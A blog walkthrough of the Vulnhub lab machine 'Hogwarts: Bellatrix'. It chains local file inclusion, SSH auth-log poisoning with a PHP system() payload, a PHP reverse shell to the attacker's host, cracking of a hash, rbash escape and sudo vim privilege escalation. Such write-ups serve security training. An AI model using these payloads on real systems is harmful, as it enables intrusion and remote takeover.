---
layout: post
title:  "Vulnhub - HOGWARTS: BELLATRIX"
date:   2020-12-09 22:00:00 +1100
category: hacking
---

## Introduction
*The evil Bellatrix Lestrange has escaped from the prison of Azkaban, but as ... Find out and tell the Minister of Magic  
Difficult: Medium  
This works better in VirtualBox  
Hints --> Brute force is not necessary, unless it is required. ncat is the key ;)*

This is [HOGWARTS: BELLATRIX](https://www.vulnhub.com/entry/hogwarts-bellatrix,609/) from Vulnhub.

## Ports
SSH and HTTP only.

## HTTP
On the front page of the website we get a long string of text repeating the phrase *ikilledsiriusblack* 44 times (I think) and finally ending with **.php**. In the page source we get the following hints:

>Nah ... this time there are no clues in the source code ...   
o yeah, maybe I've already told you a directory .php? :)
		
And:

{% raw %}
/*  
   $file = $_GET['file'];  
   if(isset($file))  
   {  
       include("$file");  
   }  
*/  
{% endraw %}

In case it's not obvious: the PHP code provides an LFI vulnerability, and the hint about ncat in the description suggests log poisoning. Let's dig in.


## LFI
The hints made it relatively obvious, but the LFI was here:

``
http://bellatrix/ikilledsiriusblack.php?file=../../../../../../../../../../../etc/apache2/apache2.conf
``

With /etc/passwd I could see we had two users, *lestrange* and *bellatrix*. I haven't read (or watched) Harry Potter so I don't know if these two are related or something. My daughter is reading it now, maybe she can tell me. I could read the apache configuration files, but even though I knew where the log files were I couldn't read them. So how to do the log poisoning?

## SSH/Auth log
You can do [auth.log](https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/) poisoning with an attempted SSH login:

``
root@kali:/opt/vulnhub/bellatrix# ssh "<?php system($_GET['cmd']); ?>"@192.168.1.158
``

And I *could* read **/var/log/auth.log**; so this was the way in. When I read auth.log with the LFI I couldn't see my PHP code above where I thought it should be, but I sent a few commands with Burp Suite repeater and it was definitely responding, eg:

``
GET /ikilledsiriusblack.php?file=../../../../../../../../../../../var/log/auth.log&cmd=pwd HTTP/1.1
``

This was my shell command:

``
GET /ikilledsiriusblack.php?file=../../../../../../../../../../../var/log/auth.log&cmd=php+-r+'$sock%3dfsockopen("192.168.1.150",1234)%3bexec("/bin/sh+-i+<%263+>%263+2>%263")%3b' HTTP/1.1
``

And I was in.

## On the box
In */var/www/html* we find *'c2VjcmV0cw=='*. Uh ... what?

{% highlight shell %}
www-data@bellatrix:/var/www/html$ echo 'c2VjcmV0cw==' | base64 -d
echo 'c2VjcmV0cw==' | base64 -d
secrets
{% endhighlight %}

Oh, okay then. In there we have:

{% highlight shell %}
4.0K drwxr-xr-x 2 root root 4.0K Nov 28 11:41 .
4.0K drwxr-xr-x 3 root root 4.0K Nov 28 09:23 ..
4.0K -rw-r--r-- 1 root root 1.3K Nov 28 08:42 .secret.dic
4.0K -rw-r--r-- 1 root root  117 Nov 28 11:41 Swordofgryffindor
{% endhighlight %}

That's a list of possible password (.secret.dic) and a hash (Swordofgryffindor):

>lestrange:$6$1eIjsdebFF9/rsXH$NajEfDYUP7p/sqHdyOIFwNnltiRPwIU0L14a8zyQIdRUlAomDNrnRjTPN5Y/WirDnwMn698kIA5CV8NLdyGiY0

I'll give them both to John:

{% highlight shell %}
root@kali:/opt/vulnhub/bellatrix# john hash -w=./possible_passwords 
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ihateharrypotter (lestrange)
{% endhighlight %}

Now we can SSH in as *lestrange*.

## Lestrange
Lestrange has *rbash* as his login shell, which makes life difficult. We can [escape](https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/) it though:

``
root@kali:/opt/vulnhub/bellatrix# ssh lestrange@bellatrix -t "bash --noprofile"
``

Once we've done that, we find out *lestrange* can use *vim* as anyone, and that's our privesc per [GTFOBins](https://gtfobins.github.io/gtfobins/vim/#sudo):

{% highlight shell %}
lestrange@bellatrix:/dev/shm$ sudo -l
Coincidiendo entradas por defecto para lestrange en bellatrix:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

El usuario lestrange puede ejecutar los siguientes comandos en bellatrix:
    (ALL : ALL) NOPASSWD: /usr/bin/vim
lestrange@bellatrix:/dev/shm$ sudo -u root /usr/bin/vim -c ':!/bin/sh'

# whoami
root
root{ead5a85a11ba466011fced308d460a76}
# id;hostname
uid=0(root) gid=0(root) grupos=0(root)
bellatrix
{% endhighlight %}
